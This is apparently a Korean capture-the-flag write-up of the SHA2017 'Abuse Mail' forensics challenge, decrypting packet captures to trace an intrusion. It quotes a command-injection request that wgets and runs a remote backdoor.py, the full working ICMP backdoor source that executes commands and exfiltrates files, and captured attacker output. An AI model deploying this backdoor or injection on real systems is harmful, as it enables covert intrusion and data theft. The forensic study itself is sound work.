## Abuse Mail (300)

> Our abuse desk received an mail that someone from our network has hacked their company. With their help we found some suspected traffic in our network logs, but we can't find what exactly has happened. Can you help us to catch the culprit?

 > [abusemail.tgz](./abusemail.tgz)  `233b7cb7f8113baca2f8d29d74105887`


문제 풀이과정이 기므로 잡다한 문제 설명은 생략하고 풀이 과정만 집중하겠다.

먼저 `abuse01.pcap` 파일을 보자.

`telnet`을 보면 `esp`의 설정 값을 알 수 있다.

```
root@vpn1: ~.root@vpn1:~# ip xfrm state
src 10.11.0.1 dst 10.11.0.83
	proto esp spi 0xce9b2ab8 reqid 1 mode tunnel
	replay-window 32 flag af-unspec
	auth-trunc hmac(sha1) 0x17f298179ebf35a4fa12d5d2c3f3b0466f435282 96
	enc cbc(aes) 0xfb59dc471ca7f58beb30cd0d1bcbb83d6bc0fe76bca7e92bf5c0e455b23e4fe4
	encap type espinudp sport 4500 dport 4500 addr 0.0.0.0
	anti-replay context: seq 0x0, oseq 0xd, bitmap 0x00000000
src 10.11.0.83 dst 10.11.0.1
	proto esp spi 0xcaa4cf43 reqid 1 mode tunnel
	replay-window 32 flag af-unspec
	auth-trunc hmac(sha1) 0xab7271cc8e3d0c403ed75323f8f8f582c784e821 96
	enc cbc(aes) 0x28fcaa9d777f940fac57e1be15477f5f074547b6a723df9243b0eb06bdd74619
	encap type espinudp sport 4500 dport 4500 addr 0.0.0.0
	anti-replay context: seq 0xd, oseq 0x0, bitmap 0x00001fff
.]0;root@vpn1: ~.root@vpn1:~#
```

`Wireshark`의 설정에 들어가서 `ESP`부분에 key를 추가해주자
![](./img/img01.png)

첫 번째 셋팅
> protocol : IPv4 <br>
> src ip : 10.11.0.1 <br>
> dst ip : 10.11.0.83 <br>
> SPI : * <br>
> encryption : AES-CBC [RFC3062] <br>
> key : 0xfb59dc471ca7f58beb30cd0d1bcbb83d6bc0fe76bca7e92bf5c0e455b23e4fe4 <br>
> authentication : HMAC-SHA-1-96 [RFC2404] <br>
> authentication key : 0x17f298179ebf35a4fa12d5d2c3f3b0466f435282

두 번째 셋팅
> protocol : IPv4 <br>
> src ip : 10.11.0.83 <br>
> dst ip : 10.11.0.1 <br>
> SPI : * <br>
> encryption : AES-CBC [RFC3062] <br>
> key : 0x28fcaa9d777f940fac57e1be15477f5f074547b6a723df9243b0eb06bdd74619 <br>
> authentication : HMAC-SHA-1-96 [RFC2404] <br>
> authentication key : 0xab7271cc8e3d0c403ed75323f8f8f582c784e821

그렇게 복호화된 패킷들속에서 `HTTP`부분을 보면 `backdoor.py`를 다운받고 실행하는것을 볼 수 있다.

```sh
GET /?ip=%3Bwget%20http://10.5.5.207/backdoor.py%20-O%20/tmp/backdoor.py HTTP/1.1
Host: 10.29.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

### backdoor.py

```python
#!/usr/bin/env python

import base64
import sys
import time
import subprocess
import threading

from Crypto import Random
from Crypto.Cipher import AES
from scapy.all import *

BS = 16
pad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)
unpad = lambda s : s[0:-ord(s[-1])]
magic = "SHA2017"


class AESCipher:

    def __init__( self, key ):
        self.key = key

    def encrypt( self, raw ):
        raw = pad(raw)
        iv = Random.new().read( AES.block_size )
        cipher = AES.new( self.key, AES.MODE_CBC, iv )
        return base64.b64encode( iv + cipher.encrypt( raw ) )

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

def run_command(cmd):
    ps = subprocess.Popen(cmd,shell=True,stdout=subprocess.PIPE,stderr=subprocess.STDOUT)
    output = ps.communicate()[0]
    return output

def send_ping(host, magic, data):
    data = cipher.encrypt(data)
    load = "{}:{}".format(magic, data)
    time.sleep(1)
    sr(IP(dst=host)/ICMP()/load, timeout=1, verbose=0)

def chunks(L, n):
    for i in xrange(0, len(L), n):
        yield L[i:i+n]

def get_file(host, magic, fn):
    time.sleep(1)
    data = base64.urlsafe_b64encode(open(fn, "rb").read())
    cnt = 0
    icmp_threads = []
    for line in chunks(data, 500):
        t = threading.Thread(target = send_ping, args = (host,magic, "getfile:{}:{}".format(cnt,line)))
        t.daemon = True
        t.start()
        icmp_threads.append(t)
        cnt += 1

    for t in icmp_threads:
        t.join()


cipher = AESCipher(sys.argv[1])

while True:
    try:
        pkts = sniff(filter="icmp", timeout =5,count=1)

        for packet in pkts:
             if  str(packet.getlayer(ICMP).type) == "8":
                input = packet[IP].load
                if input[0:len(magic)] == magic:
                    input = input.split(":")
                    data = cipher.decrypt(input[1]).split(":")
                    ip = packet[IP].src
                    if data[0] == "command":
                        output = run_command(data[1])
                        send_ping(ip, magic, "command:{}".format(output))
                    if data[0] == "getfile":
                        #print "[+] Sending file {}".format(data[1])
                        get_file(ip, magic, data[1])
    except:
        pass
```


그리고 다음과 같은 패킷을 통해서 `sys.argv[1]`이 `K8djhaIU8H2d1jNb`라는걸 알 수 있다.

```sh
GET /?ip=%3Bnohup%20sudo%20python%20/tmp/backdoor.py%20K8djhaIU8H2d1jNb%20\& HTTP/1.1
Host: 10.29.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:53.0) Gecko/20100101 Firefox/53.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
Upgrade-Insecure-Requests: 1
```

일단 `backdoor.py`를 보면 `ICMP`를 통해서 백도어가 실행되는것을 알 수 있다.

`abuse01.pcap`에는 별다른 파일이 없으니 `abuse02.pcap`을 보자.

![](./img/img02.png)

`backdoor`로 통신하는 모습이 보인다. 일단 저 내용이 궁금하니 빼오자.

```python
#!/usr/bin/env python

import base64
import sys
import time
from Crypto.Cipher import AES

BS = 16
unpad = lambda s : s[0:-ord(s[-1])]
magic = "SHA2017"

class AESCipher:

    def __init__( self, key ):
        self.key = key

    def decrypt( self, enc ):
        enc = base64.b64decode(enc)
        iv = enc[:16]
        cipher = AES.new(self.key, AES.MODE_CBC, iv )
        return unpad(cipher.decrypt( enc[16:] ))

# tshark -r abuse02.pcap -Y 'icmp.type==8' -T fields -e data > icmps.txt
data = open('icmps.txt').read()
cmds = map(lambda x: x.decode('hex'), data.split('\n')[:-1])

cipher = AESCipher('K8djhaIU8H2d1jNb')
for cmd in cmds:
    cmd = cmd.split(magic + ':')[1]
    data = cipher.decrypt(cmd)
    print data
```

### 결과

```
command:ls -la
command:total 16
drwxr-xr-x 3 root     root     4096 Jul 26 09:36 .
drwxr-xr-x 3 root     root     4096 Jul 26 03:45 ..
drwxr-x--- 2 www-data www-data 4096 Jul 26 09:37 css
-rwxr-xr-x 1 www-data www-data 1664 Jul 26 04:46 index.php

command:id
command:uid=0(root) gid=0(root) groups=0(root)

command:id
command:uid=0(root) gid=0(root) groups=0(root)

command:id
command:uid=0(root) gid=0(root) groups=0(root)

command:ls -la /root
command:total 32
drwx------  5 root root 4096 Jul 27 07:27 .
drwxr-xr-x 22 root root 4096 Apr 18 05:43 ..
-rw-------  1 root root 3228 Jul 26 06:44 .bash_history
-rw-r--r--  1 root root 3106 Oct 22  2015 .bashrc
drwxr-xr-x  2 root root 4096 Jul 27 09:11 certs
drwxr-xr-x  2 root root 4096 Jul 26 03:47 .nano
-rw-r--r--  1 root root  148 Aug 17  2015 .profile
drwx------  2 root root 4096 Jul 27 07:27 .ssh

command:ls -la /root/certs
command:total 16
drwxr-xr-x 2 root root 4096 Jul 27 09:11 .
drwx------ 5 root root 4096 Jul 27 07:27 ..
-rw-r--r-- 1 root root  989 Jul 27 07:23 intranet.crt
-rw-r--r-- 1 root root  916 Jul 27 07:23 intranet.key

command:cat /root/certs/intranet.crt
command:-----BEGIN CERTIFICATE-----
MIICrDCCAhWgAwIBAgIJALfe3aETCSTsMA0GCSqGSIb3DQEBCwUAMG8xCzAJBgNV
BAYTAk5MMRIwEAYDVQQIDAlGbGV2b2xhbmQxETAPBgNVBAcMCFplZXdvbGRlMRQw
EgYDVQQKDAtTSEEyMDE3IENURjEjMCEGCSqGSIb3DQEJARYUc2hhMjAxN2N0ZkBn
bWFpbC5jb20wHhcNMTcwNzI3MTQyMzIwWhcNMTgwNzI3MTQyMzIwWjBvMQswCQYD
VQQGEwJOTDESMBAGA1UECAwJRmxldm9sYW5kMREwDwYDVQQHDAhaZWV3b2xkZTEU
MBIGA1UECgwLU0hBMjAxNyBDVEYxIzAhBgkqhkiG9w0BCQEWFHNoYTIwMTdjdGZA
Z21haWwuY29tMIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQC+H/mwETvdjGRn
n/33zsjMOyPsg5xgSCsLDTg9D8XaeGp7ZQ1habE+9G0gabrKYntVburjitcuheXK
hCo6nYWF2pSch4WjhNhCxkM++UeKRUv8xYAtSGl+6vvSrwogR+BfRuxZFAeJzvgK
hNwL7sdW2CJ7Gk89pET/W6AOBNcDWwIDAQABo1AwTjAdBgNVHQ4EFgQUFeykHO7M
V70l0IO87/3ogRb5VxMwHwYDVR0jBBgwFoAUFeykHO7MV70l0IO87/3ogRb5VxMw
DAYDVR0TBAUwAwEB/zANBgkqhkiG9w0BAQsFAAOBgQCITumB4q5A+Lu9EzUe1qAW
rjAeVfXq/qVrw+byH4VqNuEOBQ7lq151VbsXI1YQXCxVbP/r5Zxb1BfS/3qHHFDu
SRqYaxh9c+BRkdAdzkFebMbIocnaLuVFpn237Z/ysSt0PPrTaI3gUSoz/7gXB+nX
DkYKgl7BR0a72yTuLAc0GA==
-----END CERTIFICATE-----

command:cat /root/certs/intranet.key
command:-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef
/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE
KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE
3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W
8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449
kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE
pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW
BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP
dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO
HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ
IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni
+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa
ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER
iuSWkHY6ll1V1m0=
-----END PRIVATE KEY-----

command:cat /root/certs/intranet.key
command:-----BEGIN PRIVATE KEY-----
MIICdwIBADANBgkqhkiG9w0BAQEFAASCAmEwggJdAgEAAoGBAL4f+bARO92MZGef
/ffOyMw7I+yDnGBIKwsNOD0Pxdp4antlDWFpsT70bSBpuspie1Vu6uOK1y6F5cqE
KjqdhYXalJyHhaOE2ELGQz75R4pFS/zFgC1IaX7q+9KvCiBH4F9G7FkUB4nO+AqE
3Avux1bYInsaTz2kRP9boA4E1wNbAgMBAAECgYEAiYU/aedNUhc2mO3VGeXswC0W
8wDPn6UT3U6WmzRJfJkVDGQvpYJ5vnu2Y3eWsMVDSKyOIkBPHUukxzOKCBPge449
kMwW8cX0nHSGFl1HsYiY14Lr/BiOXz/c+I9Yg+Bexf5kCTYAjzqZ1ZErrIQvagNE
pXb1GGZrnrU7wH9FI8ECQQDhwEnscmqsnPr43E0eFUy3OybfQfo+mSRdq84zwHoW
BofTUUOpDZpZhIWt6JsdsSqqYVt+W8XHqILraK/EQDnpAkEA15mi7tjozljGcjVP
dYzB4m24vRK4guujNSJDXKwoDvjDI8x3iu/iTtfxkM3Swko4bxWwiUB7MOaCLgQO
HaaEowJAXIzswZcWzLV+3s/SfebVkLkbcqQl58v48L4ix2y9oJIE1UmXp5MAGHsQ
IwAdt8qOZ1OKov8U0onvQnuks5xxIQJBAMwBz5/MVfYzIIwfD7H+X9Pe2Ojn1vni
+IslgbImIL2R/CxapF8uf+j1AtpvN9eqnV3XmzU0c50g8NuT8LtzvpsCQGUArCoa
ps7xk/SxGfz3IBrsUIOn3Iqh9wqoLfu7wVuc+LFIwkrNm6D5ZnzUapvO2oqj+5ER
iuSWkHY6ll1V1m0=
-----END PRIVATE KEY-----

command:cat /etc/hosts
command:127.0.0.1	localhost
127.0.1.1	ubuntu

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
10.29.0.1	router
192.168.1.1     router
192.168.1.2     intranet

command:nohup nmap intranet > /tmp/intranet.nmap
command:
command:cat /tmp/intranet.nmap
command:
Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
Nmap scan report for intranet (192.168.1.2)
Host is up (0.00010s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 00:0C:29:3D:FD:B0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds

command:cat /tmp/intranet.nmap
command:
Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
Nmap scan report for intranet (192.168.1.2)
Host is up (0.00010s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 00:0C:29:3D:FD:B0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds

command:cat /tmp/intranet.nmap
command:
Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
Nmap scan report for intranet (192.168.1.2)
Host is up (0.00010s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 00:0C:29:3D:FD:B0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds

command:cat /tmp/intranet.nmap
command:
Starting Nmap 7.01 ( https://nmap.org ) at 2017-07-27 09:48 PDT
Nmap scan report for intranet (192.168.1.2)
Host is up (0.00010s latency).
Not shown: 997 closed ports
PORT    STATE SERVICE
22/tcp  open  ssh
80/tcp  open  http
443/tcp open  https
MAC Address: 00:0C:29:3D:FD:B0 (VMware)

Nmap done: 1 IP address (1 host up) scanned in 1.52 seconds

command:curl -k https://intranet/
command:  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100   456  100   456    0     0   4871      0 --:--:-- --:--:-- --:--:--  4903
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>401 Unauthorized</title>
</head><body>
<h1>Unauthorized</h1>
<p>This server could not verify that you
are authorized to access the document
requested.  Either you supplied the wrong
credentials (e.g., bad password), or your
browser doesn't understand how to supply
the credentials required.</p>
<hr>
<address>Apache/2.4.18 (Ubuntu) Server at intranet Port 443</address>
</body></html>

command:tcpdump -D
command:1.ens33 [Up, Running]
2.ens39 [Up, Running]
3.any (Pseudo-device that captures on all interfaces) [Up, Running]
4.lo [Up, Running, Loopback]
5.nflog (Linux netfilter log (NFLOG) interface)
6.nfqueue (Linux netfilter queue (NFQUEUE) interface)
7.usbmon1 (USB bus number 1)
8.usbmon2 (USB bus number 2)

command:tcpdump -i usbmon2 -w /tmp/usb.pcap
command:tcpdump host intranet -w /tmp/intranet.pcap
```

그러면 `abuse03.pcap`은 까보면 `getfile`을 하고 있다.

`intranet.pcap`, `usb.pcap`을 각각 저장해주자.

``` python
import base64
data = open('getfile_intranet.txt').read()

files = data.replace('\n', '').split('getfile:')[1:]
output = [0] * len(files)

for file in files:
	file = file.split(':')
	output[int(file[0])] = file[1]

f = open('intranet.pcap', 'w')
f.write(base64.urlsafe_b64decode(''.join(output)))
f.close()
```

그럼 이제 `intranet.pcap`을 열어보자
그러면 `TLS`가 뜨는데 이건 방금 `command`에서 본 `intranet.key`파일을 이용하면 복호화가 된다.

![](./img/img03.png)

`HTTP`로 `secret.zip`파일을 다운받는걸 알 수 있다.

```sh
GET /secret.zip HTTP/1.1
Host: intranet
Authorization: Basic cm9vdDpXZWxjb21lMTIz
User-Agent: curl/7.47.0
Accept: */*

HTTP/1.1 200 OK
Date: Thu, 27 Jul 2017 16:12:24 GMT
Server: Apache/2.4.18 (Ubuntu)
Last-Modified: Thu, 27 Jul 2017 15:10:23 GMT
ETag: "2a1bf-5554df6bc7584"
Accept-Ranges: bytes
Content-Length: 172479
Content-Type: application/zip

PK....	....9.J...w|...x...
```

`Export`기능으로 파일을 일단 저장해주고 열어보자.

근데 암호가 걸려있다.
![](./img/img05.png)

`usb.pcap`에 비밀번호를 키보드로 입력했을거라 생각했다.

`usb.pcap`파일을 열면 `usb`패킷이 있으니 `keyabord event`를 긁어온다.

### usb_to_key.py
```python
KEY_CODES = {
    0x04:['a', 'A'],
    0x05:['b', 'B'],
    0x06:['c', 'C'],
    0x07:['d', 'D'],
    0x08:['e', 'E'],
    0x09:['f', 'F'],
    0x0A:['g', 'G'],
    0x0B:['h', 'H'],
    0x0C:['i', 'I'],
    0x0D:['j', 'J'],
    0x0E:['k', 'K'],
    0x0F:['l', 'L'],
    0x10:['m', 'M'],
    0x11:['n', 'N'],
    0x12:['o', 'O'],
    0x13:['p', 'P'],
    0x14:['q', 'Q'],
    0x15:['r', 'R'],
    0x16:['s', 'S'],
    0x17:['t', 'T'],
    0x18:['u', 'U'],
    0x19:['v', 'V'],
    0x1A:['w', 'W'],
    0x1B:['x', 'X'],
    0x1C:['y', 'Y'],
    0x1D:['z', 'Z'],
    0x1E:['1', '!'],
    0x1F:['2', '@'],
    0x20:['3', '#'],
    0x21:['4', '$'],
    0x22:['5', '%'],
    0x23:['6', '^'],
    0x24:['7', '&'],
    0x25:['8', '*'],
    0x26:['9', '('],
    0x27:['0', ')'],
    0x28:['\n'],
    0x2C:[' '],
    0x2D:['-', '_'],
    0x2E:['=', '+'],
    0x2F:['[', '{'],
    0x30:[']', '}'],
    0x33:[';', ':'],
    0x38:['/', '?'],
    0x37:['.', '>'],
    0x2b:'[TAB]'
}

#tshark -r ./usb.pcap -Y 'usb.capdata' -T fields -e usb.capdata > keyboards.txt
datas = open('keyboards.txt').read().split('\n')[:-1]

output = ''
for data in datas:
    shift = int(data.split(':')[0], 16) / 2
    key = int(data.split(':')[2], 16)
    if key == 0:
        continue
    output += KEY_CODES[key][shift]

print output
```

### 실행결과 :
```
root
Welcome123
ls -la
curl -ks https://root:Welcome123@intranet/secret.zip
unzip secret.zip
Pyj4m4P4rtY@2017
cat secret.txt
display hamburg[
logoout
```

`password`가 `Pyj4m4P4rtY@2017`라는것을 구했다.

![](./img/img06.png)
